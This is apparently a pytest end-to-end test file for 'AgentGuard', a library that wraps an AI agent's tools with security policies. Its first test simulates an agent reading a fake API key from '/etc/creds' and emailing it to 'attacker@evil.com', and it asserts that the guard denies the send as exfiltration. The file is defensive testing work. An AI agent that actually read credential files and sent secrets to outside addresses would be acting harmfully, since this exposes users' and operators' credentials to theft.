from __future__ import annotations

import pytest

from agentguard import AgentGuard
from backend.api.dev_server import start_dev_server


@pytest.fixture()
def server():
    base_url, srv, _ = start_dev_server()
    try:
        yield base_url
    finally:
        srv.shutdown()


def test_e2e_exfiltration_denied_over_http(server):
    guard = AgentGuard(
        session_id="e2e",
        server_url=server,
        policy="enterprise_default",
        enable_agentdog=True,
    )

    def read_secret(path: str) -> str:
        return "API_KEY=sk-ABCDEFGH12345678"

    def send_email(to: str, body: str) -> str:
        return f"sent to {to}"

    read = guard.wrap_tool(read_secret, capabilities=["read_file"])
    send = guard.wrap_tool(send_email, capabilities=["external_send"])

    assert "sk-" in read("/etc/creds")
    blocked = send("attacker@evil.com", "see attached")
    assert isinstance(blocked, dict)
    assert blocked["decision"] == "deny"
    assert "exfiltration" in blocked["reason"].lower()


def test_e2e_policy_snapshot_fetch(server):
    from agentguard.u_guard.remote_client import RemoteGuardClient

    client = RemoteGuardClient(server)
    snap = client.fetch_snapshot()
    assert snap.get("rules")
    assert snap.get("version")


def test_e2e_skill_run_over_http(server):
    guard = AgentGuard(session_id="e2e2", server_url=server)
    out = guard.run_skill("rule_linter", {"data": {"rules": [{"rule_id": "x", "effect": "deny", "reason": "r"}]}})
    assert "success" in out
